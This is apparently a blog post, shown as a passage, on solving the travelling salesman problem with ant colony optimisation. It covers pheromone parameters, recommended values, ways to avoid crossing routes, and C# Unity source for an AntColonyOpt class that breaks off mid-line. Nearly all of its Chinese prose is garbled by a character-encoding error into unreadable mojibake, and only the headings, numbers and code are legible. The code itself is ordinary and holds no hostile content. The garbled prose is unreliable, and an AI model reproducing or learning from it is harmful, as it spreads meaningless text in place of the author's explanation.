Outline</h3><p>åœ¨ç”¨èšç¾¤ç®—æ³•è§£å†³TPSé—®é¢˜æ—¶ï¼Œæœ‰ä¸¤ä¸ªå¯ä»¥æé«˜æ•ˆç‡ä¸ç»“æœè´¨é‡çš„å…³é”®ï¼Œè¿™ä¸¤ä¸ªç‚¹ä¸æ˜“è¢«æ³¨æ„ï¼Œæ‰€ä»¥æ”¾åœ¨å¼€å¤´å°±è¯´</p><ul><li>ä¸€ã€å°†èš‚èšæŒ‰ç»„ç»Ÿè®¡ï¼šä¸è¦åœ¨ä¸€åªèš‚èšç»“æŸæœç´¢åç«‹å³æ›´æ–°æ•°æ®ï¼Œè€Œéœ€è¦ç­‰å¾…ä¸€å®šæ•°é‡çš„èš‚èšå‡å®Œæˆåå†æ›´æ–°</li><li>äºŒã€éšæœºé€‰å–æ¯åªèš‚èšçš„èµ·ç‚¹ï¼šå¤šæ•°æ—¶å€™ï¼Œèš‚èšå¤šç»•çš„è·¯ç¨‹å‡æ¥è‡ªäºèš‚èšåœ¨èµ°åˆ°æœ€åä¸€ä¸ªç‚¹åè¿”å›èµ·ç‚¹çš„é‚£ä¸€æ¡çº¿æ®µï¼Œå¦‚æœè®¾å®šæ¯åªèš‚èšçš„èµ·ç‚¹ä¸å˜ï¼Œæ•ˆç‡ä¼šæ›´ä½ï¼Œå¤šæ¬¡è¿­ä»£åçš„ç»“æœä¹Ÿè¿˜æ˜¯ä¼šäº§ç”Ÿäº¤å‰è·¯çº¿ï¼ˆwhich is obviously not the best solutionï¼‰</li></ul><p>æ¥ä¸‹æ¥æ˜¯æ¯è½®ï¼ˆæ¯ç»„ï¼‰èš‚èšè·‘çš„åŸºæœ¬æµç¨‹ï¼š</p><ul><li>éšæœºé€‰æ‹©èµ·ç‚¹</li><li>ç”¨è·ç¦»ä¸ä¿¡æ¯ç´ å¯¹è·¯å¾„<strong>åŠ æƒåéšæœº</strong>é€‰æ‹©è·¯å¾„</li><li>æ›´æ–°å·²é€‰æ‹©è¿‡çš„ç‚¹ï¼Œä½¿å¾—èš‚èšä¸ä¼šè¿”å›å·²ç»åˆ°è¾¾è¿‡çš„ç‚¹</li><li>å½“èµ°åˆ°æœ€åä¸€ä¸ªç‚¹ï¼Œç›´æ¥è¿”å›èµ·ç‚¹</li></ul><p>ä¸€ç»„èš‚èšè·‘å®Œåæ›´æ–°ä¿¡æ¯ç´ çŸ©é˜µ</p><ul><li>å¯¹ä¿¡æ¯ç´ çŸ©é˜µä¹˜ä»¥ä¸€ä¸ªç³»æ•°ä½¿å¾—å·²æœ‰çš„ä¿¡æ¯ç´ æµ“åº¦é™ä½<ul><li>æ ¹æ®å½“å‰ç»„èš‚èšè·‘å‡ºæ¥çš„è·¯å¾„è·ç¦»é•¿åº¦ï¼Œå½“å‰ç»„ä¸­è·¯å¾„æœ€çŸ­çš„èš‚èšç•™ä¸‹çš„ä¿¡æ¯ç´ æœ€å¤šï¼Œè€Œè·¯å¾„é•¿çš„èš‚èšä¿¡æ¯ç´ å°‘</li></ul></li></ul><h2 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h2><p>ç”±äºç®—æ³•çš„è®¡ç®—è¿‡ç¨‹æ¯”è¾ƒé›¶ç¢ï¼Œå°±ä¸æ‹¿å‡ºæ¥è¯´äº†ï¼Œåœ¨æœ€åä¼šç›´æ¥æ”¾æºç ï¼Œè¿™é‡Œä¸»è¦è§£é‡Šä¸€äº›å‚æ•°</p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><p>ç‚¹ä¹‹é—´è·ç¦»çš„è¡¨æ ¼æ˜¯å¯¹ç§°çš„</p><img src="/images/ACO_disGraph.png" style="zoom:50%;" /><p>ä¸ºäº†åªè¯»å†™ä¸€ä¸ªæ•°æ®ï¼Œåªå–è¡¨æ ¼çš„ä¸€åŠå°±å¤Ÿäº†ï¼Œç„¶åå†™ä¸€ä¸ªå‡½æ•°ï¼Œè¾“å…¥ä¸¤ä¸ªç‚¹çš„indexï¼Œè¿”å›å¯¹åº”çš„è¡¨æ ¼ä¸­è·¯å¾„çš„index</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">GetPathIndex</span>(<span class="params"><span class="built_in">int</span> cur1, <span class="built_in">int</span> cur2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (cur1 &gt; cur2)&#123;</span><br><span class="line">        <span class="built_in">int</span> tmp = cur1;</span><br><span class="line">        cur1 = cur2;</span><br><span class="line">        cur2 = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>; i &lt;= cur1; i++) index += numPoint - i;</span><br><span class="line">    index += cur2 - cur1 - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Parameters"><a href="#Parameters" class="headerlink" title="Parameters"></a>Parameters</h3><p>é¦–å…ˆéœ€è¦ä»‹ç»ä¸€ä¸‹ç®—æ³•æ¶‰åŠçš„å‡ ä¸ªé‡è¦å‚æ•°</p><h4 id="Ant"><a href="#Ant" class="headerlink" title="Ant"></a>Ant</h4><p><code>numInGroup</code>è§„å®šäº†ä¸€ä¸ªè½®æ¬¡ä¸­çš„èš‚èšæ•°é‡ï¼Œä¸€è½®ä¸­çš„èš‚èšè¶Šå°‘è¿­ä»£é¢‘ç‡è¶Šé«˜ï¼Œèš‚èšè¶Šå¤šåˆ™åœ¨æ›´çŸ­è·¯å¾„ä¸Šç•™ä¸‹ä¿¡æ¯ç´ çš„å¯èƒ½è¶Šå¤§</p><blockquote><p>Recommended Valueï¼š5~25</p></blockquote><h4 id="Pheromone"><a href="#Pheromone" class="headerlink" title="Pheromone"></a>Pheromone</h4><p>ä¿¡æ¯ç´ çš„å¿…è¦å‚æ•°æœ‰ï¼š<strong>æœ€å°å€¼ï¼Œåˆå§‹å€¼ï¼Œå¢é‡ï¼Œè¡°å‡å€¼</strong>ï¼Œä½†æˆ‘ä¸ºäº†é˜²æ­¢æµ“åº¦è¿‡é«˜ä¹Ÿå¼„äº†ä¸ªæœ€å¤§å€¼</p><ul><li><p><code>deltaPhe</code>è§„å®šäº†ä¿¡æ¯ç´ åœ¨è¿­ä»£æ—¶çš„å¢é‡</p><blockquote><p>Recommended Valueï¼š10</p></blockquote></li><li><p><code>pheMaxTimes</code>è°ƒæ•´äº†ä¿¡æ¯ç´ æœ€å¤§å€¼ï¼Œç”±äºæˆ‘çš„æœ€å¤§å€¼è¿˜å†³å®šäº†åˆå§‹å€¼ä»¥åŠåé¢çš„ä¸€äº›å¯¹ç®—æ³•çš„tweakï¼Œæ‰€ä»¥æˆ‘ç»™å‡ºçš„æ¨èå€¼ä¼šæ¯”è¾ƒå¤§ï¼Œä»¥åˆ¶é€ å‡ºä¸åŒè·¯å¾„çš„å·®å¼‚æ€§ï¼Œä»è€Œæ›´å¿«åœ°æ”¶æ•›åˆ°å¯è§‚çš„è§£</p><blockquote><p>Recommended Valueï¼š25~50</p></blockquote></li><li><p><code>pheDrop</code>å³æ¯æ¬¡å¯»è·¯åè¡°å‡çš„ç™¾åˆ†æ¯”</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pheromone[i] *= pheDrop;</span><br><span class="line"><span class="keyword">if</span> (pheromone[i] &lt; pheMin) pheromone[i] = pheMin;</span><br></pre></td></tr></table></figure><blockquote><p>Recommended Valueï¼š0.7</p></blockquote></li><li><p>å…¶ä»–å‡ ä¸ªå‚æ•°ä¸ºäº†çœäº‹å°±é€šè¿‡è‡ªå·±ä¼°è®¡çš„å…¬å¼è®¡ç®—äº†å—¯</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// calculate pheromone parameters</span></span><br><span class="line">pheMax = deltaPhe * pheMaxTimes * numInGroup;</span><br><span class="line">pheInit = pheMax / <span class="number">5</span>;</span><br><span class="line">pheMin = pheInit * Mathf.Pow(pheDrop, <span class="number">5</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>emphasizeBest</code>å› ä¸ºåœ¨ä¸€è½®è¿­ä»£ä¸­å¯èƒ½å­˜åœ¨æ²¡æœ‰èš‚èšæŒ‰ç…§å½“å‰æœ€ä¼˜è§£è¡Œè¿›çš„æƒ…å†µï¼Œä»è€Œå¯¼è‡´ç›®å‰å·²å‘ç°çš„æœ€ä¼˜è§£è·¯å¾„ä¸Šçš„ä¿¡æ¯ç´ æµ“åº¦é™ä½ï¼Œæ•…éœ€è¦åœ¨æ¯è½®è¿­ä»£ä¸­éƒ½å‡è®¾æœ‰ä¸€å®šæ•°é‡çš„èš‚èšç»è¿‡äº†æœ€ä¼˜è·¯çº¿ï¼Œæ­¤å‚æ•°å°±æ˜¯ç”¨äºè§„å®šè¿™ä¸€å…·ä½“æ•°é‡</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pheromone[i] += deltaPhe * emphasizeBest;</span><br></pre></td></tr></table></figure><blockquote><p>Recommended Valueï¼š15</p></blockquote></li></ul><h4 id="Weight"><a href="#Weight" class="headerlink" title="Weight"></a>Weight</h4><p>èšç¾¤ä¼˜åŒ–ç®—æ³•çš„æ ¸å¿ƒå°±åœ¨äºè°ƒæ•´æ¯æ¡è·¯å¾„çš„æ¦‚ç‡ï¼Œè€Œæ¦‚ç‡ç”±ä¸‹é¢çš„å…¬å¼å†³å®š</p><img src="/images/ACO_formula.png" alt="ACO_formula" style="zoom: 50%;" /><p>å…¶ä¸­ï¼Œ<code>Ï„</code>=ä¿¡æ¯ç´ æµ“åº¦ï¼Œ<code>Î·</code>=1/è·ç¦»ï¼Œ<code>Î±</code>ä¸<code>Î²</code>å°±æ˜¯ä¿©æƒé‡çš„å‚æ•°</p><p><code>phePow</code>ï¼Œå³<code>Î±</code></p><blockquote><p>Recommended Valueï¼š3.5</p></blockquote><p><code>disPow</code>å³<code>Î²</code></p><blockquote><p>Recommended Valueï¼š6</p></blockquote><h2 id="Improvement"><a href="#Improvement" class="headerlink" title="Improvement"></a>Improvement</h2><h3 id="Crossing"><a href="#Crossing" class="headerlink" title="Crossing"></a>Crossing</h3><p>æœ€å¼€å§‹è¯´è¿‡ï¼šäº¤å‰çš„è·¯çº¿æ˜æ˜¾ä¸æ˜¯æœ€ä¼˜è§£</p><p><img src="/images/ACO_crossing.png"></p><p>ä½†é€šå¸¸åœ¨æœ€å¼€å§‹çš„æ—¶å€™éƒ½ä¼šå‡ºç°äº¤å‰è·¯çº¿ï¼Œè€Œä¸”éšç€ç‚¹çš„æ•°ç›®å¢åŠ ï¼Œäº¤å‰è·¯çº¿è¢«æ¶ˆé™¤çš„æ¦‚ç‡é€æ­¥å‡å°ã€‚æ‰€ä»¥æˆ‘æ¯æ¬¡åœ¨çœ‹åˆ°æœ€ä¼˜è§£çš„å›¾ä¸­ä¸€ç›´æœ‰ä¸€ä¸ªäº¤å‰çº¿åŠå¤©ä¸åŠ¨æ—¶å°±ä¼šéå¸¸éš¾å—ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è€ƒè™‘å¦‚ä½•è®©èš‚èšè‡ªåŠ¨è§„é¿äº¤å‰</p><ul><li>åœ¨å¯»è·¯æ—¶è§„é¿äº¤å‰ï¼šé™ä½é€‰æ‹©åˆ° ä¼šä¸å·²é€‰æ‹©çš„è·¯å¾„äº¤å‰çš„ ç‚¹çš„æ¦‚ç‡</li><li>åœ¨å¼ºè°ƒæœ€ä¼˜è§£æ—¶è§„é¿äº¤å‰ï¼šä¸å¼ºè°ƒäº¤å‰è·¯çº¿çš„æœ€ä¼˜è§£ï¼Œç”šè‡³åæ‰‹å°†äº¤å‰çš„è·¯çº¿çš„ä¿¡æ¯ç´ æµ“åº¦é™ä½ï¼Œå¹¶æå‡ä¸äº¤å‰çº¿è·¯çš„ä¿¡æ¯ç´ æµ“åº¦æ¥å¼•å¯¼</li></ul><p>åº”ç”¨ä»¥ä¸Šä¸¤æ¡ï¼Œå¯ä»¥ä½¿è·¯å¾„å¿«é€Ÿè¿­ä»£è‡³ä¸€ä¸ªæ²¡æœ‰äº¤å‰çš„çŠ¶æ€</p><h3 id="Small-Angle"><a href="#Small-Angle" class="headerlink" title="Small Angle"></a>Small Angle</h3><p>è·¯çº¿ä¸­å‡ºç°æå°çš„è§’åº¦ä¹Ÿæ˜¯éå¸¸ä¸ç†æƒ³çš„ä¸€ä»¶äº‹</p><img src="/images/ACO_smallAngle.png" alt="ACO_smallAngle" style="zoom:67%;" /><p>è¯´å®è¯ç›®å‰æ²¡æœ‰ä»€ä¹ˆå¾ˆå¥½çš„è§£å†³æ–¹æ¡ˆï¼Œç›®å‰æˆ‘åšçš„ä¹Ÿä»…ä»…æ˜¯ä¸å»å¼ºåŒ–è¿™ä¸ªè·¯å¾„ä¹‹ç±»çš„ï¼Œä½†ä¸èƒ½å¿«é€Ÿå¤„ç†æ‰è¿™ç§æƒ…å½¢</p><h3 id="Annealing"><a href="#Annealing" class="headerlink" title="Annealing"></a>Annealing</h3><p>è°ƒå‚æ—¶ä¼šå‘ç°è®¸å¤šå‚æ•°éœ€è¦åŠ¨æ€è°ƒæ•´ï¼Œå¦‚åˆæœŸåº”å¢åŠ ä¿¡æ¯ç´ æµ“åº¦çš„æƒé‡ï¼Œè€ŒåæœŸå´éœ€è¦ä¿¡æ¯ç´ ä¸è·ç¦»çš„å¹³è¡¡ä¸‹è¿›è¡Œä¼˜åŒ–ï¼Œå¦åˆ™å°±å®¹æ˜“è‡ªé—­æ”¶æ•›ï¼Œåœæ»ä¸å‰ï¼›å†æ¯”å¦‚åˆæœŸåº”ä½¿ä¿¡æ¯ç´ è¡°å‡é€Ÿç‡è¾ƒå¤§ï¼Œä»¥ä¿ƒè¿›æ”¶æ•›ï¼Œè€ŒåæœŸå´éœ€è¦é¢å¤–çš„ä¿¡æ¯ç´ æ¥å‡å°‘è‡ªé—­çš„æ¦‚ç‡</p><p>è¿™äº›éœ€æ±‚ä¸å¦ä¸€ä¼˜åŒ–ç®—æ³•ï¼š<strong>æ¨¡æ‹Ÿé€€ç«ç®—æ³•</strong> ç›¸å‘¼åº”ï¼Œåœ¨æ­¤æˆ‘æ²¡æœ‰è¿›è¡Œè¿™å·²å®ç°ï¼Œä½†è‹¥å°†è¿™ä¸¤ä¸ªç®—æ³•ç›¸ç»“åˆï¼Œåˆ™è‚¯å®šèƒ½å¤Ÿä½¿å¾—æ•ˆç‡ä¸ç»“æœè´¨é‡éƒ½å¾—åˆ°æå‡</p><h2 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h2><div class='spoiler collapsed'>    <div class='spoiler-title'>        Main    </div>    <div class='spoiler-content'>        <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">AntColonyOpt</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// min angle that the min path can have</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> angleOffset;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> crossTweakForce;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> crossDiv;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">bool</span> bParticle;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">bool</span> bDrawLine;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> emphasizeBest;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> numInGroup;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> preTimes;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> disPow;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> weightPow;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> dropPow;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> deltaPhe;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> pheMaxTimes;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> pheDrop;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> numPoint;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> xRange;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> yRange;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> minDis;</span><br><span class="line">    <span class="keyword">public</span> GameObject pointPrefab;</span><br><span class="line">    <span class="keyword">public</span> GameObject particalPrefab;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> preTimeLeft;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> Vector2[] pPos;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span>[] dis;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span>[] pheromone;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> pheMax;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> numPath;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> minPathDis;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span>[] minPath;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">bool</span> bSpace;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">bool</span> bAuto;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">bool</span> bFirstRound;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> pheInit;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> pheMin;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> NowPath nowPath;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> minCrossCnt;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> CrossPath crossPath;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> LineRenderer lineRenderer;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Particle[] particles;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> turnCnt;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">int</span> <span class="title">C2</span>(<span class="params"><span class="built_in">int</span> n</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="built_in">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = n - <span 